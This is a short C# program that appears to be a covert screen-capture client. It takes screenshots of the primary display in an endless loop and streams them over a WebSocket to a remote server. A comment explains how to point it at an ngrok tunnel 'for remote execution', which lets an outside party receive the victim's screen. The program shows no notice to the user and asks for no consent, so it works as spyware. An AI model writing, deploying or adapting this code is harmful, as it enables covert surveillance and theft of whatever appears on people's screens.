using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using WebSocketSharp;

class Program
{
    static void Main()
    {
        const string serverAddress = "ws://0.0.0.0:3000"; // for remote execution replace 0.0.0.0 to ip and port from ngrok (ngrok tcp 3000)
        using (var ws = new WebSocket(serverAddress))
        {
            ws.OnOpen += (sender, e) =>
            {
                Console.WriteLine("Successfully connected to the WebSocket server");
            };

            ws.OnClose += (sender, e) =>
            {
                Console.WriteLine($"Connection closed. Code: {e.Code}, Reason: {e.Reason}");
            };

            ws.Connect();

            while (true)
            {
                Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics gfxScreenshot = Graphics.FromImage(screenshot);
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

                using (MemoryStream ms = new MemoryStream())
                {
                    screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                    byte[] bitmapData = ms.ToArray();
                    ws.Send(bitmapData);
                }

                //Thread.Sleep(100);
            }
        }
    }
}
